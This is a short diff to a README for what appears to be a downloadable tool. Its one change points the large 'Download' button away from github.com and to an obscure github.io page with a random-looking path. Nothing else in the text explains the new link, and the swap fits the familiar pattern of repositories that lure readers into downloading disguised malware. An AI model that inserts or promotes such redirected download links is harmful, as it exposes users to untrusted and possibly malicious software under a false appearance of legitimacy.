@@ -8,7 +8,7 @@
   [![License](https://img.shields.io/badge/License-MIT-white?style=for-the-badge)](#)
   
 </div>
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://bolisez.github.io/id/ox997z12f1"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
